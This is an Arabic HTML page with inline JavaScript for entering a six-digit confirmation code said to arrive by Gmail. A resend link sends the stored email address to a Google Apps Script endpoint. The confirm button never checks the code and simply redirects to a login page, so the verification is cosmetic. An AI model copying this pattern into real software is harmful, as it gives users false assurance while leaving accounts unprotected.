<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>
        body { 
            font-family: sans-serif; 
            margin: 0; 
            display: flex; 
            justify-content: center; 
            background-color: #EAF0E9; /* نفس لون الصفحة الأولى */
            min-height: 100vh;
        }

        .main-content {
            width: 100%;
            max-width: 400px;
            padding: 40px 15px; 
            display: flex; 
            flex-direction: column; 
            align-items: center;
        }

        .instruction-text {
            font-size: 16px; 
            font-weight: bold;
            color: #000;
            margin-bottom: 30px;
            text-align: center;
            white-space: nowrap; /* نص في سطر واحد كما طلبت */
            width: 100%;
        }

        .otp-container {
            display: flex;
            justify-content: space-between;
            width: 100%;
            gap: 5px;
            margin-bottom: 35px;
            direction: ltr;
        }

        .otp-container input {
            width: 14%;
            aspect-ratio: 1 / 1.2;
            text-align: center;
            font-size: 22px;
            font-weight: bold;
            border: 1px solid #c8d1c7;
            border-radius: 12px;
            background-color: #ffffff;
            outline: none;
            transition: 0.3s;
        }

        .otp-container input:focus {
            border: 2px solid #2EAF4A;
        }

        .action-btn {
            width: 100%;
            background-color: #ffffff;
            color: #ccc;
            border: 1px solid #c8d1c7;
            padding: 18px;
            border-radius: 15px;
            font-size: 20px;
            font-weight: bold;
            cursor: not-allowed;
            margin-bottom: 25px;
            transition: 0.3s;
        }

        /* الزر "يشعل" أخضر عند اكتمال الـ 6 أرقام */
        .action-btn.active {
            background-color: #2EAF4A;
            color: #ffffff;
            border: none;
            cursor: pointer;
        }

        .resend-link {
            font-size: 18px;
            font-weight: bold;
            color: #000;
            text-decoration: none;
            cursor: pointer;
            transition: 0.3s;
        }

        .resend-link.loading {
            color: #999;
            pointer-events: none;
        }
    </style>
</head>
<body>

    <div class="main-content">
        <div class="instruction-text">إدخلوا رمز التأكيد الذي توصلتم به في رسالة Gmail</div>

        <div class="otp-container" id="otpFields">
            <input type="number" pattern="[0-9]*" inputmode="numeric">
            <input type="number" pattern="[0-9]*" inputmode="numeric">
            <input type="number" pattern="[0-9]*" inputmode="numeric">
            <input type="number" pattern="[0-9]*" inputmode="numeric">
            <input type="number" pattern="[0-9]*" inputmode="numeric">
            <input type="number" pattern="[0-9]*" inputmode="numeric">
        </div>

        <button id="submitOtp" class="action-btn" disabled>تأكيد</button>

        <div id="resendBtn" class="resend-link">إعادة إرسال الرمز</div>
    </div>

<script>
    const inputs = document.querySelectorAll('#otpFields input');
    const btn = document.getElementById('submitOtp');
    const resendBtn = document.getElementById('resendBtn');
    
    // الرابط الجديد الخاص بك لتلقي/إرسال الرسائل
    const scriptURL = 'https://script.google.com/macros/s/AKfycbxy-1Z37l9ynTk10ndPsF4iu7D4I41Ag3KUwnx8KnGKf7yrGSN0IB3u3glol4daSMQCuA/exec';

    // دعم اللصق والتنقل التلقائي
    inputs[0].addEventListener('paste', (e) => {
        const data = e.clipboardData.getData('text').trim();
        if (data.length === 6 && !isNaN(data)) {
            data.split('').forEach((char, index) => {
                if(inputs[index]) inputs[index].value = char;
            });
            inputs[5].focus();
            updateButtonState();
        }
    });

    inputs.forEach((input, index) => {
        input.addEventListener('input', (e) => {
            if (e.target.value.length > 1) e.target.value = e.target.value.slice(0, 1);
            if (e.target.value !== "" && index < inputs.length - 1) inputs[index + 1].focus();
            updateButtonState();
        });

        input.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && e.target.value === "" && index > 0) inputs[index - 1].focus();
        });
    });

    function updateButtonState() {
        const code = Array.from(inputs).map(i => i.value).join('');
        if (code.length === 6) {
            btn.disabled = false;
            btn.classList.add('active');
        } else {
            btn.disabled = true;
            btn.classList.remove('active');
        }
    }

    // وظيفة إعادة إرسال الرمز المربوطة بالرابط الجديد
    resendBtn.addEventListener('click', async () => {
        const email = localStorage.getItem('storedEmail');
        if (!email) {
            alert("خطأ: لم يتم العثور على البريد الإلكتروني. يرجى العودة للخلف.");
            return;
        }

        resendBtn.innerText = "جاري الإرسال...";
        resendBtn.classList.add('loading');

        try {
            // إرسال الطلب للرابط الجديد
            await fetch(`${scriptURL}?email=${encodeURIComponent(email)}&action=resend`);
            alert("تم إرسال رمز جديد إلى بريدك بنجاح");
        } catch (error) {
            console.error("Error:", error);
            alert("حدث خطأ أثناء محاولة الإرسال");
        } finally {
            resendBtn.innerText = "إعادة إرسال الرمز";
            resendBtn.classList.remove('loading');
        }
    });

    btn.addEventListener('click', () => {
        // التوجيه للقسم الثالث
        window.location.href = "../login/"; 
    });
</script>

</body>
</html>
